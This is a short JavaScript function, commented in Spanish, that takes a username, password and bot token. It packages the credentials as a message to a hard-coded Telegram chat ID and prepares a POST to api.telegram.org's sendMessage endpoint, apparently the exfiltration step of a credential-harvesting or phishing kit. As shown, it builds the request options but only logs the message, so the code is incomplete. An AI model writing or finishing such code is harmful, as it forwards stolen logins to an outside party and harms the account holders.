export default function sendMessageToChat(username, password, token) {
    // const chatId = '7487498429'// se elimino
    const chatId = 7087786159 // id abisai
    const message = JSON.stringify({
        chat_id: chatId,
        text: {
            username,
            password
        }
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(message)
        }
    };
    console.log(message)

}
